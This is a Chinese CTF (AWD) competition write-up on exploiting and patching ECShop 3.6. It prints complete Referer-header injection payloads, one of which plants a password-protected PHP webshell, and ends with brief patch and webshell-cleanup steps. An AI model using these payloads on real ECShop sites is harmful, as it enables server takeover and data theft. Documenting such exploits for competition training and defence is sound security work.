> 原文链接: https://www.anquanke.com//post/id/217925 


# 2020年国家网络安全宣传周福建省网络空间安全技能竞赛AWD Writeup


                                阅读量   
                                **209362**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01b8357918dc0bb510.jpg)](https://p3.ssl.qhimg.com/t01b8357918dc0bb510.jpg)



## 漏洞利用

1、 访问目标系统，是个ECShop商城网站。

**[![](https://p0.ssl.qhimg.com/t013e72e689eace3d5b.png)](https://p0.ssl.qhimg.com/t013e72e689eace3d5b.png)**

2、 浏览界面发现， ecshop 版本为 3.6，ecshop3.6 存在命令执行漏洞

[![](https://p3.ssl.qhimg.com/t019a422ee93858563b.png)](https://p3.ssl.qhimg.com/t019a422ee93858563b.png)

3、 进行漏洞利用，启动 burpsuite。

[![](https://p4.ssl.qhimg.com/t01191de325dcd84e8a.png)](https://p4.ssl.qhimg.com/t01191de325dcd84e8a.png)

4、 注册账户,访问 user.php 并传参数 act=login 同时抓包

[![](https://p1.ssl.qhimg.com/t018bdfe16bbc72348a.png)](https://p1.ssl.qhimg.com/t018bdfe16bbc72348a.png)

5、 添加 Referer 头信息并传入 poc

显示 Phpinfo 信息如下

Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:`{`s:3:”num”;s:107:”*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e66

6f0928293b2f2f7d787878,10– -“;s:2:”id”;s:11:”-1′

UNION/*”;`}`45**ea207d7a2b68c49582d2d22adf953a**

Wehshell 如下（会在网站根目录下生成一个 1.php,密码：1337）:

Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:`{`s:3:”num”;s:289:”*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274

286261736536345f6465636f646528275a6d6c735a563977645852665932397564475

67564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58

314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10

— -“;s:2:”id”;s:11:”-1′ UNION/*”;`}`

[![](https://p5.ssl.qhimg.com/t014737ed1ca860cfdb.png)](https://p5.ssl.qhimg.com/t014737ed1ca860cfdb.png)

[![](https://p1.ssl.qhimg.com/t01e312df6041a8789e.png)](https://p1.ssl.qhimg.com/t01e312df6041a8789e.png)

6、 执行如下 poc 可直接上传一个 webshell

[![](https://p0.ssl.qhimg.com/t015eb2158f169cc8c1.png)](https://p0.ssl.qhimg.com/t015eb2158f169cc8c1.png)

7、 使用蚁剑进行 webshell 连接

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0107b42cb821d9b0c8.png)

**竞赛详情了解****：**<u>[http://www.si.net.cn/](http://www.si.net.cn/)</u>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f932ec1357887c84.png)



## 漏洞防护

1、对漏洞进行修复,进入网站服务器内，修改/includes/lib_insert.php

[![](https://p1.ssl.qhimg.com/t0163a93cc2c7028cfc.png)](https://p1.ssl.qhimg.com/t0163a93cc2c7028cfc.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c370ee10ff178945.png)

2、使用 hmwebshell 工具扫描木马，进行删除

[![](https://p5.ssl.qhimg.com/t01a56740c5725eb368.png)](https://p5.ssl.qhimg.com/t01a56740c5725eb368.png)



## 活动简介

网络空间的竞争，归根到底是人才的竞争。9月12日至13日，由省委网信办、省教育厅、省公安厅联合主办的2020年国家网络安全宣传周福建省网络空间安全技能竞赛高校学生组暨“黑盾杯”赛项成功举办。

竞赛详情了解：[<u>http://www.si.net.cn/</u>](http://www.si.net.cn/)
